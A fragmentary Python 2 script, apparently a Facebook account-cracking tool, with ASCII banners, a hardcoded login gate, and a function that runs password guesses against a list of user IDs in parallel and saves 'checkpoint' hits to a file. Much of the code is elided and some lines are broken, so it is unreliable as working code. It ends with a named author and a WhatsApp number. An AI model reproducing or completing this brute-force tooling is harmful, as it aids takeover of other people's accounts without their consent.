#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Aizaz Khan
...
jalan('              \033[1;96m....................Mr_Anonymous .....................:')
jalan("\033[1;93m ,--.   ,--.,------.         ,---.  ,--.  ,--. ,-----. ,--.  ,--.,--.   ,--.,--.   ,--. ,-----. ,--. ,--. ,---.     
jalan('\033[1;93m |   `.'   ||  .--. '       /  O  \ |  ,'.|  |'  .-.  '|  ,'.|  | \  `.'  / |   `.'   |'  .-.  '|  | |  |'   .-'  
jalan('\033[1;93m |  |'.'|  ||  '--'.'      |  .-.  ||  |' '  ||  | |  ||  |' '  |  '.    /  |  |'.'|  ||  | |  ||  | |  |`.  `-.  
jalan("\033[1;93m|  |   |  ||  |\  \ ,----.|  | |  ||  | `   |'  '-'  '|  | `   |    |  |   |  |   |  |'  '-'  ''  '-'  '.-'    |  
jalan("\033[1;93m `--'   `--'`--' '--''----'`--' `--'`--'  `--' `-----' `--'  `--'    `--'   `--'   `--' `-----'  `-----' `-----'    
print "\033[1;93m♡     ♡\033[1;96mLogin Mr_Anonynous\033[1;95m♡╰──────────•◈•──────────╯♡"                                                                                                                                                                                                                               

CorrectUsername = "Mr_Anonynous "
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Mr.Anonymous 
	    time.sleep(2)
            loop = 'false'
        else:
...
def login():
	...
	try:
		...
		os.system('clear')
		print logo
		jalan(' \033[1;92mWarning: \033[1;97mDUE TO COVID-19' )
		jalan(' \033[1;92mWarning: \033[1;97mMUST USE YOUR HANDS UPTO 30 SECONDS AND STAY AT HOME ' )
		jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )
		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mMr_Anonymous\033[1;95m♡──────────•◈•──────────♡"
...
def menu():
	...
	try:
		...
		keluar()
	os.system("clear") #Dev:Mr_Anonynous 
	print logo
...
def pilih_super():
	...
	def main(arg):
		global Chekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Mr_Anonynous 
		try:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass14
																	cek = open("out/checkpoint.txt", "a")
	...
	p.map(main, id)
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mMr_Anonymous\033[1;95m♡──────────•◈•──────────♡"
	print "  \033[1;93m«---•◈•---Developed By Aizaz Khan---•◈•---»" #Dev:Mr_Anonynous
...
♡──────────────•◈•──────────────♡.
: \033[1;96m .....Aizaz Khan  Mr_Anonymous........... \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                Whatsapp Num
               +923118787244"""
